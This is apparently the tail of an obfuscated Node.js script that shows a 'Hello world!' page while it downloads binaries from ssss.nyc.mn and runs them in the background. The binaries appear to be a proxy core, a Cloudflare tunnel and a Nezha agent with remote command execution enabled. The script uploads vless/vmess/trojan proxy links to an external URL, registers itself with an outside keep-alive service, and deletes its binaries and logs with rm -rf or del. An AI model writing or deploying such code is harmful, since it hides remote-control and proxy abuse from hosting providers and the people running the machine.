_0x5f02a3&&_0x5f02a3[_0x50f4eb(0x1a7)]===0xc8?(console[_0x50f4eb(0x20d)](_0x50f4eb(0x23b)),_0x5f02a3):null;}catch(_0x316bbd){if(_0x316bbd[_0x50f4eb(0x1d1)]){if(_0x316bbd[_0x50f4eb(0x1d1)][_0x50f4eb(0x1a7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x246091=fs[_0x50f4eb(0x225)](listPath,_0x50f4eb(0x253)),_0x157932=_0x246091[_0x50f4eb(0x226)]('\x0a')[_0x50f4eb(0x1c0)](_0x4ddd47=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4ddd47));if(_0x157932['length']===0x0)return;const _0x22200e={};_0x22200e[_0x50f4eb(0x1f0)]=_0x157932;const _0x2cbad6=JSON[_0x50f4eb(0x26b)](_0x22200e);try{const _0x46c3c5={};_0x46c3c5[_0x50f4eb(0x201)]='application/json';const _0x55c660={};_0x55c660['headers']=_0x46c3c5;const _0x477192=await axios[_0x50f4eb(0x1e9)](UPLOAD_URL+_0x50f4eb(0x276),_0x2cbad6,_0x55c660);return _0x477192&&_0x477192['status']===0xc8?(console[_0x50f4eb(0x20d)](_0x50f4eb(0x294)),_0x477192):null;}catch(_0x39e08c){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xe47a1a=_0x51e3,_0x5a4d2d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5a4d2d[_0xe47a1a(0x26a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5a4d2d[_0xe47a1a(0x26a)](phpPath);process[_0xe47a1a(0x249)]===_0xe47a1a(0x207)?exec(_0xe47a1a(0x1f6)+_0x5a4d2d[_0xe47a1a(0x21c)]('\x20')+'\x20>\x20nul\x202>&1',_0x1fac66=>{const _0x1fcf08=_0xe47a1a;console[_0x1fcf08(0x200)](),console[_0x1fcf08(0x20d)](_0x1fcf08(0x214)),console[_0x1fcf08(0x20d)](_0x1fcf08(0x272));}):exec(_0xe47a1a(0x264)+_0x5a4d2d[_0xe47a1a(0x21c)]('\x20')+'\x20>/dev/null\x202>&1',_0x1811b2=>{const _0x175083=_0xe47a1a;console[_0x175083(0x200)](),console['log'](_0x175083(0x214)),console[_0x175083(0x20d)](_0x175083(0x272));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x373fed=_0x4495f0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x373fed(0x20d)](_0x373fed(0x28b));return;}try{const _0x1fcc88={};_0x1fcc88['url']=PROJECT_URL;const _0x5d322e={};_0x5d322e['Content-Type']=_0x373fed(0x203);const _0x60c646={};_0x60c646[_0x373fed(0x259)]=_0x5d322e;const _0x91fb45=await axios[_0x373fed(0x1e9)]('https://oooo.serv00.net/add-url',_0x1fcc88,_0x60c646);return console[_0x373fed(0x20d)](_0x373fed(0x22a)),_0x91fb45;}catch(_0x3ddce0){return console[_0x373fed(0x291)](_0x373fed(0x26f)+_0x3ddce0[_0x373fed(0x24a)]),null;}}async function startserver(){const _0x3f9479=_0x4495f0;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1947fe){console[_0x3f9479(0x291)](_0x3f9479(0x269),_0x1947fe);}}function _0x9e23(){const _0x562951=['/config.yaml\x22\x20>/dev/null\x202>&1\x20&','headers','blackhole','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','quic','http\x20server\x20is\x20running\x20on\x20port:','send','charAt','isFile','127.0.0.1','538wMTein','config.json','rm\x20-rf\x20','table','then','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','./tmp','Error\x20in\x20startserver:','push','stringify','set','warn','2053','Add\x20automatic\x20access\x20task\x20faild:\x20','https://amd64.ssss.nyc.mn/bot','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','loglevel','443','pkill\x20-f\x20\x22[','/api/add-nodes','ARGO_DOMAIN:','Hello\x20world!','web\x20running\x20error:\x20','unshift','return\x20(function()\x20','arm64','{}.constructor(\x22return\x20this\x22)(\x20)','NEZHA_PORT','/sub.txt\x20saved\x20successfully','apply','match','musk.8.2.9.a.f.f.0.7.0.0.6.2.ip6.arpa','none','aid','8579288OBaJos','base64','finish','ARGO_PORT','direct','vless','Skipping\x20adding\x20automatic\x20access\x20task','text/plain;\x20charset=utf-8','/trojan-argo','Empowerment\x20success\x20for\x20','forEach','bind','error','true','php\x20running\x20error:\x20','Nodes\x20uploaded\x20successfully','UUID','type','readdirSync','AUTO_ACCESS','dest','sni','listen','status','\x20-p\x20','.exe\x20>\x20nul\x202>&1','CFPORT','pipe','(((.+)+)+)+$','flow','\x20is\x20created','Unknown','aarch64','sub','https+local://8.8.8.8/dns-query','/vless-argo','https://ipapi.co/json/','basename','createWriteStream','recursive','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','streamSettings','__proto__','https://amd64.ssss.nyc.mn/web','\x0a\x20\x20tunnel:\x20','enabled','\x20failed:\x20','search','filter','2083','PROJECT_URL','pop','Download\x20','CFIP','--tls','NAME','fileName','get','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','http','random','&path=%2Fvless-argo%3Fed%3D2560#','&path=%2Ftrojan-argo%3Fed%3D2560#','tunnel.yml','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','response','/api/delete-nodes','NEZHA_KEY','scy','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','wsSettings','level','host','FILE_PATH','/vmess-argo?ed=2560','arm','\x22\x20>\x20/dev/null\x202>&1','unlinkSync','unlink','from','tcp','timeout','\x20-s\x20','path','boot.log','UPLOAD_URL','\x20-c\x20','block','mkdirSync','post','exception','\x0a\x0atrojan://','?encryption=none&security=tls&sni=','PORT','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','console','nodes','xtls-rprx-vision','axios','trojan','existsSync','settings','del\x20/f\x20/q\x20','data','util','5401190RcSmuK','Error\x20reading\x20boot.log:','port','\x20is\x20running','writeFileSync','protocol','network','clear','Content-Type','NEZHA_SERVER','application/json','amd','map','length','win32','/dev/null','all','false','Error\x20downloading\x20files:','chmod','log','catch','metadataOnly','TunnelSecret','ArgoDomain:','password','Error\x20executing\x20command:\x20','App\x20is\x20running','https://arm64.ssss.nyc.mn/v1','Unhandled\x20error\x20in\x20startserver:','2264541bPrAWF','test','constructor','https://arm64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/agent','join','floor','tunnel.json','substring','8273888mPJePh','tls','clients','sub.txt','close','readFileSync','split','org','SUB_PATH','firefox','automatic\x20access\x20task\x20added\x20successfully','prototype','has','sniffing','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','net','subscription','3502488rMTVfs','security','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','nohup\x20','freedom','8443','fileUrl','\x0a\x20\x20credentials-file:\x20','/vmess-argo','4502IQNFcq','Subscription\x20uploaded\x20successfully','destOverride','npm\x20running\x20error:\x20','\x20>/dev/null\x202>&1\x20&','?security=tls&sni=','/tunnel.yml\x20run','env','toString','statSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0a\x0avmess://','2087','&fp=firefox&type=ws&host=','decryption','platform','message','success','includes','vmess','/api/add-subscriptions','outbounds','add','http://ip-api.com/json/','access','utf-8','5201538BjhqzL','inbounds','\x20-c\x20\x22','country_code'];_0x9e23=function(){return _0x562951;};return _0x9e23();}startserver()['catch'](_0x136fc5=>{const _0x7b5de6=_0x4495f0;console[_0x7b5de6(0x291)](_0x7b5de6(0x216),_0x136fc5);}),app[_0x4495f0(0x1a6)](PORT,()=>console[_0x4495f0(0x20d)](_0x4495f0(0x25d)+PORT+'!'));